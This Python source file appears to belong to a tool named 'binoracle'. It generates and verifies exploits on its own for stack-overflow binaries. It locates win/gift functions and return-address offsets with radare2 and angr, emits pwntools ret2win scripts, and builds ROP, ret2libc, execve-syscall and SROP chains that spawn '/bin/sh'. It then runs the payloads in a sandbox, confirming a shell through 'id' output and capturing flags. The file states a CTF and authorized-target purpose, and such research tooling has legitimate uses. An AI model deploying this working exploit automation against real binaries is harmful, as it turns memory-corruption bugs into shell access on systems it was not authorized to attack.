"""Automatic PoC generation and verification (ret2win class).

For a binary with a gift/win function reachable through a stack overflow, this:
  1) finds the offset to the saved return address with angr (no execution needed),
  2) builds a concrete pwntools ret2win exploit (with a ret gadget for stack alignment),
  3) optionally RUNS it in an x86-64 Docker sandbox and confirms the objective.

This turns "reachability verified" into "exploit verified". For AUTHORIZED targets / CTF."""
from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
from dataclasses import dataclass, field
from typing import List, Optional

from ._sandbox import run_bash

try:
    import angr  # type: ignore
    import logging as _lg
    _lg.getLogger("angr").setLevel(_lg.ERROR)
    _lg.getLogger("cle").setLevel(_lg.ERROR)
    _lg.getLogger("pyvex").setLevel(_lg.ERROR)
    _HAVE_ANGR = True
except Exception:
    _HAVE_ANGR = False


@dataclass
class PoCResult:
    ok: bool
    stage: str
    offset: Optional[int] = None
    win: Optional[int] = None
    script: str = ""
    payload_hex: str = ""
    verified: bool = False
    run_output: str = ""
    flag: str = ""
    notes: List[str] = field(default_factory=list)


def _r2(binary: str, cmd: str) -> str:
    exe = shutil.which("r2") or shutil.which("radare2")
    if not exe:
        return ""
    try:
        out = subprocess.run([exe, "-q", "-e", "scr.color=0", "-e", "log.quiet=true", "-2",
                              "-c", cmd, binary], capture_output=True, text=True, timeout=90)
        return out.stdout
    except subprocess.TimeoutExpired:
        return ""


# Gift keyword as a DELIMITED token, not a bare substring: this must not match "win" inside
# "_Unwind_Resume" / "winner" (glibc is full of such names in a static binary), which would
# false-route the exploit to ret2win against a bogus target.
_GIFT_RE = re.compile(r"(?:^|[^a-z])(win|shell|backdoor|flag|give)(?:[^a-z]|$)")


_SHELL_STR_RE = re.compile(r'"(?:/bin/(?:sh|bash|dash)\\?x?0?0?|sh -c)"')


def find_win(binary: str) -> Optional[int]:
    funcs = _r2(binary, "aa;afl")
    for line in funcs.splitlines():
        if _GIFT_RE.search(line.lower()):
            m = re.match(r"\s*(0x[0-9a-fA-F]+)", line)
            if m:
                return int(m.group(1), 16)
    # Fallback para binarios STRIPPED (sin nombres de funcion, asi que _GIFT_RE no tiene nada
    # que matchear): system/execve/execl NUNCA se stripean (son imports dinamicos, hacen falta
    # para el enlazado), asi que se busca la funcion que LOS LLAMA (via xref, no hace falta
    # iterar todas las funciones) y se confirma que tambien referencia un string de shell -- esa
    # es la funcion gift, tenga o no un nombre. Confirmado con un binario real (ret2win.stripped):
    # fcn.00401176 (sin nombre) llama a system("/bin/sh"), misma direccion que 'win' en la
    # variante no-stripped del mismo reto.
    #
    # NOTA (investigado en vivo, descartado adrede): probar aqui la sesion r2 CACHEADA (r2session)
    # en vez de un subproceso nuevo por llamada parecia la optimizacion obvia (evita repetir
    # `aaa`) -- pero `r.cmd('axt @ sym.imp.<sink>')` sobre esa sesion PERSISTENTE se cuelga de
    # verdad en esta version de radare2 (5.5.0; confirmado con y sin el simbolo presente, y
    # `cmd_timeout()` -- pensado exactamente para esto -- tampoco recuperaba el pipe a tiempo de
    # forma fiable aqui). El subproceso ONE-SHOT de abajo (`_r2()`) SI es fiable: cada llamada es
    # un `radare2` nuevo con su propio `subprocess.run(..., timeout=90)`, que Python SI mata de
    # forma dura si se cuelga. Mas lento (repite `aaa`), pero nunca cuelga el pipeline.
    for sink in ("system", "execve", "execl", "execlp"):
        # Xrefs to an import are only populated by FULL analysis (`aaa`); plain `aa` leaves
        # `axt @ sym.imp.<sink>` empty, so the stripped gift was never found (confirmed on
        # radare2 5.5.0: `aa; axt` -> nothing, `aaa; axt` -> the real caller).
        callers = _r2(binary, f"aaa; axt @ sym.imp.{sink}")
        for m in re.finditer(r"^\S+\s+(0x[0-9a-fA-F]+)\s+\[CALL", callers, re.M):
            call_addr = m.group(1)
            dis = _r2(binary, f"aaa; pdf @ {call_addr}")
            if not _SHELL_STR_RE.search(dis):
                continue
            # `call_addr` es la direccion del `call system`, EN MEDIO de la funcion; `afo`
            # resuelve la direccion de INICIO real de la funcion que lo contiene (necesaria
            # para saltar ahi como target de ret2win), sea o no un simbolo con nombre.
            start = _r2(binary, f"aaa; afo @ {call_addr}")
            sm = re.search(r"(0x[0-9a-fA-F]+)", start)
            if sm:
                return int(sm.group(1), 16)
    return None


def _word_size(binary: str) -> int:
    """Tamano de puntero en bytes (4 o 8). Sin esto, un ret2win de 32 bits (ret2win32) se
    empaquetaba con p64/8 bytes fijos: los 4 bytes de mas escriben sobre lo que siga en la
    pila tras la direccion de retorno (un registro guardado, padding, otro frame) y el proceso
    termina con SIGSEGV en vez de saltar a win() -- confirmado en sandbox con ret2win32."""
    try:
        info = json.loads(_r2(binary, "ij") or "{}").get("bin", {})
        return 4 if info.get("bits") == 32 else 8
    except Exception:
        return 8


def find_ret_gadget(binary: str) -> Optional[int]:
    out = _r2(binary, "/R ret")
    for line in out.splitlines():
        m = re.match(r"\s*(0x[0-9a-fA-F]+)\s+c3\s+ret\b", line)
        if m:
            return int(m.group(1), 16)
    m = re.search(r"(0x[0-9a-fA-F]+)\s+c3\s+ret", out)
    return int(m.group(1), 16) if m else None


def _pc_offset_worker(binary: str, q) -> None:
    """Child-process body: symbolically flood stdin until PC is unconstrained and report the
    offset. Runs in its own process so the parent can hard-kill it on deadline (see below)."""
    try:
        import angr as _angr
        proj = _angr.Project(binary, auto_load_libs=False)
        state = proj.factory.entry_state()
        simgr = proj.factory.simulation_manager(state, save_unconstrained=True)
        steps = 0
        while simgr.active and not simgr.unconstrained and steps < 400:
            simgr.step()
            steps += 1
        if simgr.unconstrained:
            u = simgr.unconstrained[0]
            pc_val = u.solver.eval(u.regs.pc)
            pc_bytes = pc_val.to_bytes(proj.arch.bytes, "little")
            off = u.posix.dumps(0).find(pc_bytes)
            q.put(off if off >= 0 else None)
            return
    except Exception:
        pass
    q.put(None)


def find_pc_offset(binary: str, maxlen: int = 400, budget_s: float = 20.0) -> Optional[int]:
    """Find the offset from input to the saved return address, symbolically (no run).

    HARD-bounded by WALL-CLOCK time: a menu/heap-driven binary (malloc/free with a symbolic
    size/index) can make a SINGLE simgr.step() take minutes on its own, because Z3's bit-blaster
    for symbolic MULTIPLICATION (size*count style) can blow up -- confirmed via a process sample
    showing 100% time inside bit_blaster_tpl::mk_const_case_multiplier. A between-steps deadline
    check does NOT help there: the loop is stuck INSIDE one step, so it never comes back to
    check. The only reliable bound is to run the exploration in a child process and KILL it at
    the deadline; Z3's C/Python call won't honor a Python-level timeout or signal. This is a
    stack-overflow-shaped strategy (flood stdin until PC is unconstrained); for heap binaries it
    then fails fast so the static fallback (_static_offset) gets its turn within the budget."""
    if not _HAVE_ANGR:
        return None
    import multiprocessing as mp
    try:
        ctx = mp.get_context("spawn")        # fork after importing z3 can deadlock; spawn is safe
        q = ctx.Queue()
        p = ctx.Process(target=_pc_offset_worker, args=(binary, q), daemon=True)
        p.start()
        p.join(budget_s)
        if p.is_alive():
            p.terminate(); p.join(2)
            if p.is_alive():
                p.kill(); p.join(1)
            return None
        try:
            return q.get(timeout=1)
        except Exception:
            return None
    except Exception:
        return None


def build_script(binary: str, offset: int, win: int, ret: Optional[int]) -> str:
    pfn = "p32" if _word_size(binary) == 4 else "p64"
    align = f"    {pfn}({hex(ret)}),  # ret gadget (stack alignment)\n" if ret else ""
    return f'''#!/usr/bin/env python3
# binoracle auto-PoC (ret2win) for an AUTHORIZED target
from pwn import *
context.binary = elf = ELF({binary!r})
io = process(elf.path)
payload = flat({{
    {offset}: [
{align}        {pfn}({hex(win)}),  # win()
    ]
}})
io.sendline(payload)
io.interactive()
'''


def _docker_run(binary: str, payload: bytes) -> (bool, str):
    d = os.path.dirname(os.path.abspath(binary))
    name = os.path.basename(binary)
    with open(os.path.join(d, ".poc_payload"), "wb") as f:
        f.write(payload + b"\n")
    # gets()/scanf() read stdin through a buffered stdio FILE and read-ahead the whole pipe,
    # leaving the child shell's fd 0 at EOF. So we do NOT append the shell command to the
    # payload; instead we feed it after a short pause, once the read-ahead already happened
    # and the shell from system("/bin/sh") is the one blocking on stdin.
    shell_cmd = "echo ___POC_SHELL___; id; cat flag* /flag* 2>/dev/null; echo ___POC_END___"
    run = (f"chmod +x ./{name}; "
           f"{{ cat .poc_payload; sleep 0.5; printf '%s\\n' \"{shell_cmd}\"; sleep 0.3; }} "
           f"| stdbuf -oL -eL ./{name} 2>&1 | head -80")
    try:
        # binoracle-pwn (no gcc:13): trae libc6:i386, necesaria para binarios de 32 bits como
        # ret2win32. Sin la imagen, run_bash cae a ejecucion nativa (solo binarios x86-64).
        engine, out = run_bash(binary, run, timeout=120, mem_mb=256)
        if engine is None:
            return (False, out)
        return (True, out)
    finally:
        try:
            os.unlink(os.path.join(d, ".poc_payload"))
        except OSError:
            pass


_STATIC_OFFSET_FN_CAP = 400       # ver nota de regresion mas abajo
_STATIC_OFFSET_TIME_BUDGET = 20.0  # segundos


def _static_offset(binary: str) -> Optional[int]:
    """Offset a la direccion de retorno guardada para el caso clasico de buffer de pila, SIN
    ejecutar: la variable local (base rbp) mas profunda de la funcion que llama a un sink de
    lectura, mas el tamano del rbp/ebp guardado (word size: 4 en x86, 8 en x86_64). Robusto
    donde la ejecucion simbolica de angr se equivoca.

    REGRESION encontrada en vivo (corriendo la suite de tests completa): el bucle hacia UN
    `pdf @ fn` (desensamblado completo) POR FUNCION de `aflj`, sin limite ni presupuesto. En un
    binario estaticamente enlazado (p.ej. ropme_pie: 1086 funciones, la libc entera queda
    embebida) eso son 1000+ viajes de ida y vuelta sincronos por el pipe de r2 -- minutos, no
    milisegundos -- colgando el pipeline entero (chain-analyzer, audit, investigate) para
    cualquier binario estatico. El caso comun (binario dinamico, decenas de funciones propias)
    sigue siendo instantaneo; esto solo acota el caso patologico, degradando a 'no concluyente'
    (best=None, ya manejado por _offset_candidates) en vez de colgar."""
    import time as _time
    try:
        import r2pipe
        r = r2pipe.open(binary, flags=["-2"])
        r.cmd("aaa")
        fns = json.loads(r.cmd("aflj") or "[]")
        read_sinks = ("read", "gets", "fgets", "scanf", "isoc99_scanf", "recv", "fread", "gets_s")
        best = None
        t0 = _time.time()
        for i, fn in enumerate(fns):
            if i >= _STATIC_OFFSET_FN_CAP or (_time.time() - t0) > _STATIC_OFFSET_TIME_BUDGET:
                break
            name = fn.get("name", "")
            dis = r.cmd(f"pdf @ {name}") or ""
            if not any(s in dis for s in read_sinks):
                continue
            vs = json.loads(r.cmd(f"afvj @ {name}") or "{}")
            for v in vs.get("bp", []):
                off = (v.get("ref") or {}).get("offset")
                if isinstance(off, int) and off < 0:
                    cand = -off + _word_size(binary)
                    if best is None or cand > best:
                        best = cand
        r.quit()
        return best
    except Exception:
        return None


def _offset_candidates(binary: str, offset: Optional[int]) -> list:
    """Offsets a probar, en orden. Si el usuario da uno, solo ese. Si no, combina angr y el
    metodo estatico (r2), descartando valores absurdos (<=0, el 0 bogus que a veces da angr).
    Por cada candidato tambien se prueban sus vecinos a +/- word_size: el padding de alineacion
    que el compilador mete antes del buffer (o entre el buffer y rbp/ebp guardado) puede
    desplazar el offset real por exactamente eso, y tanto angr como el metodo estatico pueden
    fallar por ese margen (confirmado en ret2win32: angr dio 80, el offset real era 76)."""
    if offset is not None:
        return [offset]
    wsz = _word_size(binary)
    cands = []
    for fn in (find_pc_offset, _static_offset):
        try:
            o = fn(binary)
        except Exception:
            o = None
        if not (isinstance(o, int) and o > 0):
            continue
        for cand in (o, o - wsz, o + wsz):
            if cand > 0 and cand not in cands:
                cands.append(cand)
    return cands


def _check_success(output: str, r: PoCResult) -> None:
    low = (output or "").lower()
    shelled = "___poc_shell___" in low or "uid=" in low
    if any(m in low for m in ("win reached", "you win", "win()")) or shelled:
        r.verified = True
        r.stage = "verified"
        r.notes.append("PoC ejecutado en sandbox: " +
                       ("shell obtenida (ejecuto comandos tras el ret2win)." if shelled
                        else "objetivo alcanzado (win)."))
        import re as _re
        fm = _re.search(r"[A-Za-z0-9_]+\{[^}\n]{1,80}\}", output or "")
        if fm:
            r.flag = fm.group(0)
            r.notes.append("FLAG capturada: " + r.flag)


def autopoc(binary: str, offset: Optional[int] = None, run: bool = True) -> PoCResult:
    r = PoCResult(ok=False, stage="init")
    win = find_win(binary)
    if win is None:
        r.stage = "no-win"
        r.notes.append("no se encontro una funcion gift (win/shell/flag). ret2win no aplica; "
                       "prueba ROP/ret2libc.")
        return r
    r.win = win
    cands = _offset_candidates(binary, offset)
    if not cands:
        r.stage = "no-offset"
        r.notes.append("no se pudo determinar el offset automaticamente (angr ni r2). "
                       "Pasa --offset N (hallalo con cyclic).")
        return r

    ret = find_ret_gadget(binary)
    wsz = _word_size(binary)
    best: Optional[PoCResult] = None
    for off in cands:
        rr = PoCResult(ok=True, stage="built", win=win, offset=off)
        rr.script = build_script(binary, off, win, ret)
        payload = b"A" * off + (ret.to_bytes(wsz, "little") if ret else b"") + win.to_bytes(wsz, "little")
        rr.payload_hex = payload.hex()
        if run:
            ran, output = _docker_run(binary, payload)
            rr.run_output = output
            if ran:
                _check_success(output, rr)
        if rr.verified or not run:
            if len(cands) > 1 and rr.verified:
                rr.notes.append(f"offset acertado: {off} (probados {cands}).")
            return rr
        best = best or rr
    if best is not None:
        best.notes.append(f"PoC construido pero no verificado con los offsets probados {cands}; "
                          "revisa la salida.")
        return best
    return r


def render_poc(r: PoCResult, lang: str = "es") -> str:
    out = ["## Auto-PoC (ret2win)\n"]
    if not r.ok:
        out.append(f"No se pudo construir el PoC ({r.stage}).")
        out += [f"- {n}" for n in r.notes]
        return "\n".join(out)
    out.append(f"- win: `{hex(r.win)}`")
    out.append(f"- offset: `{r.offset}`")
    out.append(f"- verificado en sandbox: **{'SI' if r.verified else 'no'}**")
    if r.notes:
        out += [f"- {n}" for n in r.notes]
    out.append("\n### payload\n```\npayload = bytes.fromhex('" + r.payload_hex + "')\n```")
    out.append("### exploit pwntools\n```python\n" + r.script + "```")
    if r.run_output:
        out.append("### salida de la ejecucion en sandbox\n```\n" + r.run_output.strip()[:1500] + "\n```")
    return "\n".join(out)


def _docker_run_raw(binary: str, data: bytes):
    """Run the target in an x86-64 sandbox feeding EXACTLY `data` on stdin (line-buffered).
    Docker image preferred; falls back to native isolation when it is absent."""
    d = os.path.dirname(os.path.abspath(binary))
    name = os.path.basename(binary)
    with open(os.path.join(d, ".poc_raw"), "wb") as f:
        f.write(data)
    try:
        engine, out = run_bash(
            binary, f"chmod +x ./{name}; stdbuf -oL -eL ./{name} < .poc_raw 2>&1 | head -60",
            timeout=120, mem_mb=256)
        if engine is None:
            return (False, out)
        return (True, out)
    finally:
        try:
            os.unlink(os.path.join(d, ".poc_raw"))
        except OSError:
            pass


def autorop(binary: str, offset=None, run: bool = True) -> dict:
    """Build a ROP execve('/bin/sh') / ret2libc chain and, if runnable, VERIFY it spawns a
    shell in the sandbox by having that shell echo a marker. Works out of the box for static
    binaries (ret2syscall). Dynamic ret2libc still needs a libc/leak."""
    try:
        import os as _os
        _os.environ.setdefault("PWNLIB_NOTERM", "1")
        from pwn import context, ELF, ROP
        from binoracle import _quiet_pwn as _qp; _qp()
    except Exception as e:
        return {"ok": False, "note": f"pwntools no disponible: {e}"}
    try:
        context.clear(); context.log_level = "error"
        elf = ELF(binary, checksec=False); context.binary = elf
    except Exception as e:
        return {"ok": False, "note": f"no carga: {e}"}
    binsh = next(elf.search(b"/bin/sh\x00"), None)
    is32 = getattr(elf, "bits", 64) == 32          # x86-32: cdecl, execve=11, int 0x80, SROP distinto
    rop = ROP(elf)
    built = False
    strategy = ""
    if binsh is not None:
        # 1) ret2libc system('/bin/sh') if system is available (dynamic or static-with-system).
        #    ARCH-AGNOSTICO: rop.call() coloca el arg en el registro (x64) o en la pila (x86-32 cdecl)
        #    segun el contexto del ELF. Verificado en sandbox con ret2win32 (x86-32): shell real.
        try:
            sysaddr = elf.plt.get("system") or (elf.symbols or {}).get("system")
            if sysaddr:
                try:
                    rop.raw(rop.find_gadget(["ret"]).address)
                except Exception:
                    pass
                rop.call(sysaddr, [binsh]); built = True; strategy = "ret2libc system"
        except Exception:
            pass
        # 2) explicit execve syscall chain. ARCH-AWARE: en x86-32 es eax=11/ebx/ecx/edx + `int 0x80`;
        #    en x86-64 es rax=0x3b/rdi/rsi/rdx + `syscall`. Antes esta rama fijaba SIEMPRE rax/rdi
        #    (64-bit) con execve=0x3b aunque el binario fuese de 32 bits -> cadena incorrecta.
        if not built:
            try:
                if is32:
                    rop.eax = 0x0b; rop.ebx = binsh; rop.ecx = 0; rop.edx = 0
                    sc = rop.find_gadget(["int 0x80"])
                else:
                    rop.rax = 0x3b; rop.rdi = binsh; rop.rsi = 0; rop.rdx = 0
                    sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
                if sc:
                    rop.raw(sc.address)
                    built = True
                    strategy = ("execve int0x80 (gadgets, x86-32)" if is32
                                else "execve syscall (gadgets)")
            except Exception:
                pass
    # 3) Let pwntools build execve('/bin/sh'), STAGING the string into writable memory when the
    #    binary has no "/bin/sh" literal (common in static binaries where the linker dropped it,
    #    e.g. staticrop). Passing the literal bytes makes pwntools write them to .bss/.data with
    #    the available gadgets and point the syscall at them -- so we don't depend on an existing
    #    string. A fresh ROP() per attempt so a half-built chain from above isn't reused.
    if not built:
        target = binsh if binsh is not None else b"/bin/sh\x00"
        try:
            rop = ROP(elf)
            rop.execve(target, 0, 0)
            rop.chain()                             # force resolution now (raises if unsatisfiable)
            built = True
            strategy = ("execve (pwntools auto)" if binsh is not None
                        else "execve (pwntools, '/bin/sh' staged a .bss)")
        except Exception:
            built = False
    # 4) explicit SROP fallback: a fake sigcontext (rt_sigreturn, RAX=15) sets ALL registers at
    #    once, so it needs only `pop rax; ret` + a syscall gadget -- no pop rdi/rsi/rdx. Used when
    #    the execve chain can't satisfy the arg registers. Needs an in-memory "/bin/sh" (binsh).
    # 4) explicit SROP fallback: a fake sigcontext sets ALL registers at once, so it needs only
    #    `pop {r,e}ax; ret` + a syscall gate -- no pop rdi/rsi/rdx. Used when the execve chain
    #    can't satisfy the arg registers. Needs an in-memory "/bin/sh" (binsh). Arch-aware.
    if not built and binsh is not None:
        try:
            from pwn import SigreturnFrame
            rop = ROP(elf)
            if is32:
                # x86-32: sigreturn is syscall 119 (0x77) via `int 0x80`; the restored frame runs
                # execve (eax=11) with ebx=&binsh, triggered by the frame's eip = int 0x80 gate.
                pop_ax = rop.find_gadget(["pop eax", "ret"])
                sc = rop.find_gadget(["int 0x80"])
                if pop_ax and sc:
                    frame = SigreturnFrame(kernel="i386")   # i386 frame needs the kernel arch
                    frame.eax = 0x0b                 # execve
                    frame.ebx = binsh
                    frame.ecx = 0
                    frame.edx = 0
                    frame.eip = sc.address
                    # modern Linux i386 user segments (pwntools defaults to legacy 0x73/0x7b/0)
                    frame.cs = 0x23; frame.ss = 0x2b; frame.ds = 0x2b
                    frame.es = 0x2b; frame.gs = 0x63; frame.fs = 0
                    rop.raw(pop_ax.address); rop.raw(0x77)   # EAX = 119 (sigreturn)
                    rop.raw(sc.address)                      # int 0x80 -> sigreturn consumes the frame
                    rop.raw(bytes(frame))
                    built = True; strategy = "SROP (sigreturn execve, x86-32)"
            else:
                pop_rax = rop.find_gadget(["pop rax", "ret"])
                sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
                if pop_rax and sc:
                    frame = SigreturnFrame()
                    frame.rax = 0x3b                 # execve
                    frame.rdi = binsh
                    frame.rsi = 0
                    frame.rdx = 0
                    frame.rip = sc.address           # the frame's RIP runs execve('/bin/sh', 0, 0)
                    rop.raw(pop_rax.address); rop.raw(15)   # RAX = 15 (rt_sigreturn)
                    rop.raw(sc.address)                     # syscall -> rt_sigreturn consumes the frame
                    rop.raw(bytes(frame))
                    built = True; strategy = "SROP (sigreturn execve)"
        except Exception:
            pass
    if not built:
        return {"ok": False, "note": "no se pudo construir cadena automatica (sin /bin/sh o "
                "gadgets suficientes; ret2libc dinamico necesita libc/leak)"}
    try:
        chain = rop.chain()
    except Exception as e:
        # p.ej. falta un 'pop rdi' para colocar el argumento: la cadena es insatisfactible.
        return {"ok": False, "note": f"no se pudo resolver la cadena ROP (gadget faltante: {e}). "
                "Prueba ret2win (autopoc) o ret2libc con leak (autolibc)."}
    marker = "BINORACLE_PWNED"
    res = {"ok": True, "verified": False, "offset": offset, "strategy": strategy,
           "chain": rop.dump()}
    if offset is not None:
        res["payload_hex"] = (b"A" * offset + chain).hex()

    if run:
        # Offsets a probar: el explicito si lo hay; si no, los buenos candidatos (r2 estatico +
        # angr valido, descartando el 0 bogus) PRIMERO, y una lista comun de respaldo despues.
        _brute = [72, 64, 88, 56, 40, 96, 104, 120, 128, 136, 48, 80, 112, 32, 24, 16, 144, 152, 160]
        if offset is not None:
            candidates = [offset]
        else:
            candidates = _offset_candidates(binary, None)
            candidates += [c for c in _brute if c not in candidates]
        for cand in candidates:
            if cand is None:
                continue
            data = (b"A" * cand + chain).ljust(1024, b"A") + b"\n echo " + marker.encode() + b"\n"
            ran, out = _docker_run_raw(binary, data)
            if ran and marker in out:
                res["verified"] = True
                res["offset"] = cand
                res["payload_hex"] = (b"A" * cand + chain).hex()
                res["run_output"] = out
                if offset is None:
                    res["note"] = f"offset {cand} hallado por busqueda dinamica"
                return res
            res["run_output"] = out
        if offset is None:
            res["note"] = "cadena construida; no se verifico shell (offset no hallado)"
    elif offset is None:
        res["note"] = "cadena construida; pasa --offset para verificar"
    return res


def render_rop_poc(r: dict) -> str:
    out = ["## Auto-ROP (shell via ROP)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No se pudo: " + r.get("note", "")])
    out.append(f"- estrategia: {r.get('strategy')}")
    out.append(f"- offset: `{r.get('offset')}`")
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("note"):
        out.append(f"- {r['note']}")
    if r.get("chain"):
        out.append("\n### cadena\n```\n" + r["chain"][:1200] + "\n```")
    if r.get("run_output"):
        out.append("### salida sandbox\n```\n" + r["run_output"].strip()[:800] + "\n```")
    return "\n".join(out)
